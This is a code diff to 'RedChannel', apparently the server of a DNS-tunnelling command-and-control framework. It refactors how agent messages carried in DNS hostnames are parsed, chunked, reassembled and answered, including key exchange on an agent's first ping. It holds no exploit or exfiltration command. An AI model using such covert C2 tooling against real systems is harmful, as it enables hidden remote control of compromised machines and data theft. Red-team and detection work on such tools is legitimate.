@@ -58,6 +58,16 @@ export type C2MessageResponse = {
     end: Function;
 };
 
+export type AgentMessageSegments = {
+    antiCacheValue: string;
+    agentId: string;
+    dataId: string;
+    command: implant.AgentCommand;
+    chunkNumber: number;
+    totalChunks: number;
+    chunk: string;
+};
+
 // to clarify the Map()s
 export type DataId = string;
 export type DataChunk = string;
@@ -74,8 +84,8 @@ export type AgentModel = {
     channel?: AgentChannel;
     allowKeyx?: boolean;
     sendq: SendQEntry[];
-    // each agent command has a map of dataId => chunks[]
-    recvq: Map<implant.AgentCommand, Map<DataId, DataChunk[]>>;
+    // each agent has a map of dataId => chunks[]
+    recvq: Map<DataId, DataChunk[]>;
 };
 
 export enum AgentChannel {
@@ -174,7 +184,7 @@ export default class RedChannel {
                 channel: channel,
                 allowKeyx: false,
                 sendq: [],
-                recvq: new Map<implant.AgentCommand, Map<DataId, DataChunk[]>>(),
+                recvq: new Map<DataId, DataChunk[]>(),
             });
         }
     }
@@ -407,6 +417,63 @@ export default class RedChannel {
         return this.agents.get(agentId) || null;
     }
 
+    parseAgentMessageSegments(hostname: string): AgentMessageSegments | void {
+        const segmentsArray = hostname.slice(0, hostname.length - this.modules.c2.config.domain.length).split(".");
+        if (segmentsArray.length < Config.EXPECTED_DATA_SEGMENTS) {
+            throw new Error(`invalid message, not enough data segments (${segmentsArray.length}, expected ${Config.EXPECTED_DATA_SEGMENTS}): ${hostname}`);
+        }
+        const segments: AgentMessageSegments = {
+            antiCacheValue: "",
+            agentId: "",
+            dataId: "",
+            command: implant.AgentCommand.AGENT_UNSPECIFIED,
+            chunkNumber: 0,
+            totalChunks: 0,
+            chunk: "",
+        };
+
+        // used to prevent flooding
+        segments.antiCacheValue = segmentsArray[0];
+        segments.agentId = segmentsArray[1];
+
+        segments.dataId = segmentsArray[2];
+        if (segments.dataId.length < 2) {
+            throw new Error(`invalid data id: ${segments.dataId}`);
+        }
+        try {
+            const commandInt = parseInt(segments.dataId.slice(-2), 16);
+            if (!this.isValidCommand(commandInt)) {
+                throw new Error(`unknown command from ${segments.agentId}: ${commandInt}, ignoring...`);
+            }
+            segments.command = <implant.AgentCommand>commandInt;
+        } catch (ex) {
+            throw new Error(`failed to parse command byte: ${emsg(ex)}`);
+        }
+
+        let chunkNumber: number;
+        let totalChunks: number;
+        try {
+            chunkNumber = parseInt(segmentsArray[3].slice(0, 2), 16);
+            totalChunks = parseInt(segmentsArray[3].slice(2, 4), 16);
+            if (isNaN(chunkNumber) || isNaN(totalChunks)) throw new Error(`chunks are not properly numbered: current: ${chunkNumber}, total: ${totalChunks}`);
+        } catch (ex) {
+            throw new Error(`failed to parse chunk number and total chunks: ${emsg(ex)}`);
+        }
+        segments.chunkNumber = chunkNumber;
+        segments.totalChunks = totalChunks;
+
+        if (segments.chunkNumber > segments.totalChunks - 1) {
+            throw new Error(`chunk number is out of bounds, current: ${segments.chunkNumber}, total: ${segments.totalChunks}`);
+        }
+
+        segments.chunk = segmentsArray[4];
+        if (segments.chunk.length < 2) {
+            throw new Error(`invalid chunk: ${segments.chunk}`);
+        }
+
+        return segments;
+    }
+
     c2MessageHandler(req: C2MessageRequest, res: C2MessageResponse) {
         const question = res.question[0];
         const hostname = question.name;
@@ -435,110 +502,62 @@ export default class RedChannel {
             return res.end();
         }
 
-        const segments = hostname.slice(0, hostname.length - this.modules.c2.config.domain.length).split(".");
-        if (segments.length < Config.EXPECTED_DATA_SEGMENTS) {
-            this.log.error(`invalid message, not enough data segments (${segments.length}, expected ${Config.EXPECTED_DATA_SEGMENTS}): ${hostname}`);
+        let segments: AgentMessageSegments | void;
+        try {
+            segments = this.parseAgentMessageSegments(hostname);
+        } catch (ex) {
+            this.log.error(`failed to parse message segments for ${hostname}: ${emsg(ex)}`);
+        }
+        if (!segments) {
+            res.answer.push({
+                name: hostname,
+                type: C2AnswerType.TYPE_AAAA,
+                data: this.makeIpString(implant.C2ResponseStatus.ERROR_INVALID_MESSAGE),
+                ttl: Config.C2_ANSWER_TTL_SECS,
+            });
             return res.end();
         }
 
-        // used to prevent flooding
-        const antiCacheValue: string = segments[0];
-        const agentId: string = segments[1];
-
+        const agentId = segments.agentId;
         if (!this.agents.has(agentId)) {
             this.initAgent(agentId, channel, req.connection.remoteAddress);
             this.log.warn(`first ping from agent ${agentId}, src: ${req.connection.remoteAddress}, channel: ${channel}`);
-            try {
-                this.sendCommandKeyx(agentId);
-            } catch (ex) {
-                this.log.error(`error sending keyx: ${emsg(ex)}`);
-            }
-            // upon first ping, we don't have any keyx so we will not try to decrypt any data
-            // grab the next in queue (which should be the keyx) and respond with it.
-            let answers: C2Answer[] | void;
-            try {
-                answers = this.getNextQueuedCommand(agentId, hostname);
-            } catch (ex) {
-                this.log.error(`error getting next queued command for first keyx: ${emsg(ex)}`);
-            }
-            if (answers) {
-                res.answer = res.answer.concat(answers);
-            }
+            const answers = this.processAgentFirstPing(agentId, hostname);
+            if (answers) res.answer = res.answer.concat(answers);
             return res.end();
         }
+
         const agent = this.agents.get(agentId)!;
 
         agent.lastseen = Date.now() / 1000;
         agent.ip = req.connection.remoteAddress;
 
-        let command = 0;
-        try {
-            command = parseInt(segments[2].slice(0, 2), 16);
-        } catch (ex) {
-            this.log.error(`failed to parse command byte: ${emsg(ex)}`);
-            return res.end();
-        }
+        const dataId = segments.dataId;
+        const command = segments.command;
+        const floodId = agentId + segments.antiCacheValue;
 
-        if (!Object.values(implant.AgentCommand).includes(command)) {
-            this.log.warn(`unknown command from ${agentId}: ${command}, ignoring...`);
-            return res.end();
-        }
-
-        const floodId = agentId + antiCacheValue;
         if (this.isAgentFlooding(floodId)) {
             // we have already responded to this agent and antiCacheValue combination
-            this.log.warn(`ignoring flood from agent: ${agentId}, antiCache: ${antiCacheValue}, command: ${command}`);
+            this.log.warn(`ignoring flood from agent: ${agentId}, antiCache: ${segments.antiCacheValue}, dataId: ${dataId}`);
             return res.end();
         }
 
-        let chunkNumber = 0;
-        let totalChunks = 0;
-        try {
-            chunkNumber = parseInt(segments[2].slice(2, 4), 16);
-            totalChunks = parseInt(segments[2].slice(4, 6), 16);
-        } catch (ex) {
-            this.log.error(`error parsing chunk number and total chunks, current: ${chunkNumber}, total: ${totalChunks}: ${emsg(ex)}`);
-            return res.end();
-        }
-
-        if (chunkNumber > totalChunks - 1) {
-            this.log.error(`invalid chunk number (out of bounds), current: ${chunkNumber}, total: ${totalChunks}`);
-            return res.end();
-        }
-
-        const dataId: string = segments[3];
-        if (dataId.length < 2) {
-            this.log.error(`invalid data id: ${dataId}`);
-            return res.end();
-        }
-
-        const chunk: string = segments[4];
-        if (chunk.length < 2) {
-            this.log.error(`invalid chunk: ${chunk}`);
-            return res.end();
-        }
-
-        if (!agent.recvq.has(command)) {
-            agent.recvq.set(command, new Map<DataId, DataChunk[]>());
+        // initialize the recvq for dataId
+        if (!agent.recvq.has(dataId)) {
+            agent.recvq.set(dataId, new Array(segments.totalChunks));
         }
 
         // we use ! to tell typescript we are smarter than it
-        const recvqCommand = agent.recvq.get(command)!;
-        if (!recvqCommand.get(dataId)) {
-            recvqCommand.set(dataId, new Array(totalChunks));
-        }
-
-        const recvqDataId = recvqCommand.get(dataId)!;
-
-        recvqDataId[chunkNumber] = chunk;
+        const recvqDataId = agent.recvq.get(dataId)!;
+        recvqDataId[segments.chunkNumber] = segments.chunk;
 
         // count all data array entries, excluding undefined
         // since data is not sent in sequence, array may be [undefined, undefined, 123, undefined, 321]
-        if (this.countDataChunks(recvqDataId) === totalChunks) {
+        if (this.countDataChunks(recvqDataId) === segments.totalChunks) {
             const dataChunks = recvqDataId.join("");
 
             // process data, return answer records to send back
-            res.answer = res.answer.concat(this.processAgentData(agentId, hostname, command, dataChunks));
+            res.answer = res.answer.concat(this.processAgentData(agentId, command, hostname, dataChunks));
             return res.end();
         }
 
@@ -557,6 +576,10 @@ export default class RedChannel {
             res.answer.push({ name: hostname, type: 'A', data: "1.1.1." + length, 'ttl': ttl })
         }*/
         return res.end();
+    }
+
+    isValidCommand(command: number) {
+        return Object.values(implant.AgentCommand).includes(command);
     }
 
     isAgentFlooding(floodId: string): boolean {
@@ -582,22 +605,43 @@ export default class RedChannel {
         return false;
     }
 
-    checkInAgent(agent: AgentModel, hostname: string, checkInPayload: string): C2Answer[] | void {
+    processAgentFirstPing(agentId: string, hostname: string): C2Answer[] | void {
+        try {
+            this.sendCommandKeyx(agentId);
+        } catch (ex) {
+            this.log.error(`error sending keyx to agent ${agentId}: ${emsg(ex)}`);
+        }
+
+        // upon first ping, we don't have any keyx so we will not try to decrypt any data
+        // grab the next in queue (which should be the keyx) and respond with it.
+        let answers: C2Answer[] | void = [];
+        try {
+            answers = this.getNextQueuedCommand(agentId, hostname);
+        } catch (ex) {
+            this.log.error(`error getting next queued command for first keyx: ${emsg(ex)}`);
+        }
+        return answers;
+    }
+    checkInAgent(agent: AgentModel, hostname: string, data: string): C2Answer[] | void {
         const agentId = agent.id;
 
         let agentData = "";
         try {
-            const agentCommandResponseProto = this.decryptAgentData(agentId, checkInPayload);
-            if (agentCommandResponseProto) agentData = Buffer.from(agentCommandResponseProto.data).toString();
+            const agentCommandResponseProto = this.decryptAgentData(agentId, data);
+            if (agentCommandResponseProto) {
+                agentData = Buffer.from(agentCommandResponseProto.data).toString();
+            } else {
+                throw new Error(`invalid agent response proto`);
+            }
         } catch (ex) {
             throw new Error(`cannot decrypt checkin from ${agentId}: ${emsg(ex)}`);
         }
         if (!agentData) {
-            throw new Error(`checkin payload is invalid for ${agentId}`);
+            throw new Error(`agent response payload is invalid for ${agentId}`);
         }
 
         if (agent.sendq?.length === 0) {
-            this.log.debug(`agent ${agentId} checking in, no data to send`);
+            this.log.debug(`agent ${agent.id} checking in, no data to send`);
             return [
                 {
                     name: hostname,
@@ -608,8 +652,8 @@ export default class RedChannel {
             ];
         }
 
-        this.log.debug(`agent ${agentId} checking in, sending next queued command`);
-        const answers = this.getNextQueuedCommand(agentId, hostname);
+        this.log.debug(`agent ${agent.id} checking in, sending next queued command`);
+        const answers = this.getNextQueuedCommand(agent.id, hostname);
         return answers;
     }
 
@@ -631,7 +675,7 @@ export default class RedChannel {
         return answers;
     }
 
-    processAgentData(agentId: string, hostname: string, command: implant.AgentCommand, data: string): C2Answer[] {
+    processAgentData(agentId: string, command: implant.AgentCommand, hostname: string, data: string): C2Answer[] {
         const agent = this.agents.get(agentId);
         if (!agent) {
             this.log.error(`agent ${agentId} not found`);
